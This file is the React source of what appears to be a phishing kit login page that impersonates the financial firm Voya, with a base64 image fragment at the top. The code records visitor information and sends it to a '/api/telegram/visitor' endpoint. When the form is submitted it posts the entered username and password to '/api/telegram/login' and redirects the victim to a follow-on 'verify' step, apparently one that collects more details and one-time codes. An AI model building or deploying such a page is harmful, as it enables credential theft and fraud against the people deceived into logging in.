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";

export default function LoginPage() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [usernameError, setUsernameError] = useState(false);
  const [passwordError, setPasswordError] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [toastMessage, setToastMessage] = useState("");
  const [showToast, setShowToast] = useState(false);
  const [hasInteracted, setHasInteracted] = useState(false);

  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  const clearError = (field: string) => {
    if (field === "fu") setUsernameError(false);
    if (field === "fp") setPasswordError(false);
  };

  const showToastMessage = (msg: string) => {
    setToastMessage(msg);
    setShowToast(true);
    setTimeout(() => setShowToast(false), 2800);
  };

  const handleSignIn = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setUsernameError(false);
    setPasswordError(false);

    if (!username.trim()) {
      setUsernameError(true);
      return;
    }
    if (!password) {
      setPasswordError(true);
      return;
    }
    if (isLoginLoading) return;

    setIsLoginLoading(true);

    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });

      if (!response.ok) {
        throw new Error("Failed to send login data");
      }

      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
      }

      router.push("/verify-choice");
    } catch (error) {
      console.error("Login failed:", error);
      showToastMessage("Unable to send login details. Please try again.");
      setIsLoginLoading(false);
    }
  };

  return (
    <>
      <style>{`
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body {
          font-family: 'Open Sans', Arial, sans-serif;
          background: #fff;
          color: #333;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          font-size: 14px;
        }

        /* ══ TOP NAV ══ */
        .topnav {
          background: #fff;
          padding: 14px 18px 12px;
          display: flex;
          justify-content: center;
        }
        .topnav a {
          width: 100%;
          max-width: 1200px;
          padding: 0 24px;
          display: flex;
        }
        .voya-logo-img {
          height: 38px;
          width: auto;
          display: block;
        }

        /* ══ HERO GRID ══ */
        .hero-grid {
          display: grid;
          grid-template-columns: 330px 1fr;
          min-height: 360px;
          border: 1px solid #ddd;
          border-top: none;
          margin: 0 auto;
          max-width: 1248px;
          padding: 0 24px;
        }

        /* ── Login card ── */
        .login-col {
          border-right: 1px solid #e0e0e0;
          display: flex;
          flex-direction: column;
          background: #fff;
        }
        .navy-bar {
          height: 7px;
          background: #1b4f72;
          width: 310px;
        }
        .login-inner {
          padding: 16px 24px 28px;
          flex: 1;
        }
        .login-h {
          font-size: 1.4rem;
          font-weight: 300;
          color: #111;
          margin-bottom: 20px;
        }

        .field-wrap { margin-bottom: 4px; }
        .field-wrap input {
          width: 252px;
          height: 34px;
          border: 1px solid #bbb;
          border-radius: 3px;
          padding: 0 10px;
          font-size: 0.85rem;
          font-family: 'Open Sans', sans-serif;
          color: #666;
          outline: none;
          transition: border-color 0.15s;
        }
        .field-wrap input::placeholder { color: #999; }
        .field-wrap input:focus {
          border-color: #1b6fa8;
          box-shadow: 0 0 0 1px rgba(27,111,168,0.15);
        }
        .field-wrap.has-error input { border-color: #c0392b; }
        .err-txt {
          display: none;
          font-size: 0.7rem;
          color: #c0392b;
          margin-top: 2px;
        }
        .field-wrap.has-error .err-txt { display: block; }

        .forgot {
          display: block;
          font-size: 0.75rem;
          color: #1b6fa8;
          text-decoration: none;
          margin: 4px 0 18px;
        }
        .forgot:hover { text-decoration: underline; }

        .enter-row {
          display: flex;
          align-items: center;
          gap: 14px;
          margin-bottom: 14px;
        }
        .btn-enter {
          background: #1b4f72;
          color: #fff;
          border: none;
          border-radius: 20px;
          width: 168px;
          height: 36px;
          font-size: 0.9rem;
          font-weight: 700;
          font-family: 'Open Sans', sans-serif;
          cursor: pointer;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
          transition: background 0.15s;
        }
        .btn-enter:hover { background: #12344d; }
        .btn-enter:disabled { opacity: 0.65; cursor: not-allowed; }

        .remember-lbl {
          display: flex;
          align-items: center;
          gap: 5px;
          font-size: 0.78rem;
          color: #444;
          cursor: pointer;
          white-space: nowrap;
        }
        .remember-lbl input[type=checkbox] {
          width: 13px; height: 13px;
          accent-color: #555;
          cursor: pointer;
        }

        @keyframes spin { to { transform: rotate(360deg); } }
        .spin-ring {
          display: none;
          width: 14px; height: 14px;
          border: 2px solid rgba(255,255,255,0.4);
          border-top-color: #fff;
          border-radius: 50%;
          animation: spin 0.65s linear infinite;
        }
        .spin-ring.show { display: block; }

        .btn-register {
          background: #fff;
          color: #1b4f72;
          border: 2px solid #1b4f72;
          border-radius: 20px;
          padding: 6px 18px;
          font-size: 0.82rem;
          font-weight: 700;
          font-family: 'Open Sans', sans-serif;
          cursor: pointer;
          transition: background 0.15s, color 0.15s;
        }
        .btn-register:hover { background: #1b4f72; color: #fff; }

        .hero-banner {
          position: relative;
          overflow: hidden;
          background: #c8dce8;
        }
        .hero-banner img {
          width: 100%;
          height: 100%;
          object-fit: cover;
          object-position: center center;
          display: block;
        }

        /* ══ FOOTER ══ */
        footer {
          background: #f0f0f0;
          border-top: 1px solid #ddd;
          padding: 26px 18px 18px;
          margin-top: auto;
        }
        .footer-inner {
          max-width: 1200px;
          margin: 0 auto;
          display: flex;
          align-items: flex-start;
          gap: 24px;
        }
        .footer-brand { flex-shrink: 0; width: 280px; }
        .voya-footer-logo {
          height: 26px;
          width: auto;
          display: block;
          margin-bottom: 6px;
        }
        .footer-copy { font-size: 0.72rem; color: #555; }

        .footer-links {
          flex: 1;
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 5px 32px;
          padding: 0 12px;
        }
        .fl {
          display: flex;
          align-items: center;
          gap: 6px;
          font-size: 0.76rem;
          color: #333;
          text-decoration: none;
        }
        .fl:hover { text-decoration: underline; }

        .footer-right {
          flex-shrink: 0;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          gap: 10px;
        }
        .lang-row {
          display: flex;
          align-items: center;
          gap: 5px;
          font-size: 0.76rem;
          color: #333;
          cursor: pointer;
        }
        .lang-tri { color: #e31837; font-size: 0.5rem; }
        .socials { display: flex; gap: 8px; }
        .soc {
          width: 22px; height: 22px;
          background: #444;
          border-radius: 3px;
          display: flex; align-items: center; justify-content: center;
          text-decoration: none;
          transition: background 0.15s;
        }
        .soc:hover { background: #222; }

        /* toast */
        #toast {
          position: fixed; bottom: 24px; left: 50%;
          transform: translateX(-50%) translateY(10px);
          background: #333; color: #fff;
          font-size: 0.8rem; padding: 9px 18px; border-radius: 3px;
          opacity: 0; pointer-events: none;
          transition: opacity 0.2s, transform 0.2s; z-index: 9999; white-space: nowrap;
        }
        #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }

        @media (max-width: 900px) {
          .hero-grid { grid-template-columns: 1fr; }
          .footer-inner { flex-direction: column; }
          .footer-links { grid-template-columns: 1fr; }
        }
      `}</style>

      {/* NAV */}
      <nav className="topnav">
        <a href="#" onClick={(e) => e.preventDefault()}>
          <img className="voya-logo-img" src="/download.png" alt="Voya" />
        </a>
      </nav>

      {/* HERO */}
      <div className="hero-grid">
        {/* Login card */}
        <div className="login-col">
          <div className="navy-bar"></div>
          <div className="login-inner">
            <h2 className="login-h">Log In</h2>

            <form id="lf" onSubmit={handleSignIn} noValidate>
              <div
                className={`field-wrap ${usernameError ? "has-error" : ""}`}
                id="fu"
              >
                <input
                  type="text"
                  id="uid"
                  placeholder="Username"
                  autoComplete="username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onInput={() => clearError("fu")}
                />
                <div className="err-txt">Please enter your Username.</div>
              </div>
              <a
                className="forgot"
                href="#"
                onClick={(e) => e.preventDefault()}
              >
                Forgot Username?
              </a>

              <div
                className={`field-wrap ${passwordError ? "has-error" : ""}`}
                id="fp"
              >
                <input
                  type="password"
                  id="pwd"
                  placeholder="Password"
                  autoComplete="current-password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onInput={() => clearError("fp")}
                />
                <div className="err-txt">Please enter your Password.</div>
              </div>
              <a
                className="forgot"
                href="#"
                onClick={(e) => e.preventDefault()}
              >
                Forgot Password?
              </a>

              <div className="enter-row">
                <button
                  type="submit"
                  className="btn-enter"
                  id="eb"
                  disabled={isLoginLoading}
                >
                  <div
                    className={`spin-ring ${isLoginLoading ? "show" : ""}`}
                    id="es"
                  ></div>
                  <span id="el">{isLoginLoading ? "…" : "Enter"}</span>
                </button>
                <label className="remember-lbl">
                  <input
                    type="checkbox"
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                  />
                  Remember Me
                </label>
              </div>

              <button
                type="button"
                className="btn-register"
                onClick={() => showToastMessage("Opening registration…")}
              >
                Register Now
              </button>
            </form>
          </div>
        </div>

        {/* Hero banner */}
        <div className="hero-banner">
          <img
            src="/download (1).png"
            alt="Hero Banner"
            style={{
              width: "100%",
              height: "100%",
              objectFit: "cover",
              display: "block",
            }}
          />
        </div>
      </div>

      {/* FOOTER */}
      <footer>
        <div className="footer-inner">
          <div className="footer-brand">
            <img src="/download.png" alt="Voya" className="voya-footer-logo" />
            <p className="footer-copy">
              ©2026 Voya Service Company. All rights reserved.
            </p>
          </div>

          <div className="footer-links">
            <a className="fl" href="#" onClick={(e) => e.preventDefault()}>
              Terms of Use/Online Privacy
            </a>
            <a className="fl" href="#" onClick={(e) => e.preventDefault()}>
              Accessibility
            </a>
            <a className="fl" href="#" onClick={(e) => e.preventDefault()}>
              Security
            </a>
            <a className="fl" href="#" onClick={(e) => e.preventDefault()}>
              Browser Requirements
            </a>
            <a className="fl" href="#" onClick={(e) => e.preventDefault()}>
              Privacy Notice
            </a>
            <a className="fl" href="#" onClick={(e) => e.preventDefault()}>
              Get Adobe Reader
            </a>
          </div>

          <div className="footer-right">
            <div className="lang-row">
              English <span className="lang-tri">▲</span>
            </div>
            <div className="socials">
              <a
                className="soc"
                href="#"
                title="Facebook"
                onClick={(e) => e.preventDefault()}
              >
                <svg width="12" height="12" viewBox="0 0 24 24" fill="white">
                  <path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z" />
                </svg>
              </a>
              <a
                className="soc"
                href="#"
                title="LinkedIn"
                onClick={(e) => e.preventDefault()}
              >
                <svg width="12" height="12" viewBox="0 0 24 24" fill="white">
                  <path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-4 0v7h-4v-7a6 6 0 016-6zM2 9h4v12H2z" />
                  <circle cx="4" cy="4" r="2" fill="white" />
                </svg>
              </a>
              <a
                className="soc"
                href="#"
                title="YouTube"
                onClick={(e) => e.preventDefault()}
              >
                <svg width="12" height="12" viewBox="0 0 24 24" fill="white">
                  <path d="M22.54 6.42a2.78 2.78 0 00-1.95-1.96C18.88 4 12 4 12 4s-6.88 0-8.59.46a2.78 2.78 0 00-1.95 1.96A29 29 0 001 12a29 29 0 00.46 5.58A2.78 2.78 0 003.41 19.6C5.12 20 12 20 12 20s6.88 0 8.59-.46a2.78 2.78 0 001.95-1.95A29 29 0 0023 12a29 29 0 00-.46-5.58zM9.75 15.02V8.98L15.5 12l-5.75 3.02z" />
                </svg>
              </a>
              <a
                className="soc"
                href="#"
                title="Instagram"
                onClick={(e) => e.preventDefault()}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="white"
                  strokeWidth="2"
                >
                  <rect x="2" y="2" width="20" height="20" rx="5" />
                  <circle cx="12" cy="12" r="4" />
                  <circle cx="17.5" cy="6.5" r="1" fill="white" stroke="none" />
                </svg>
              </a>
            </div>
          </div>
        </div>
      </footer>

      {/* TOAST */}
      <div id="toast" className={showToast ? "show" : ""}>
        {toastMessage}
      </div>
    </>
  );
}
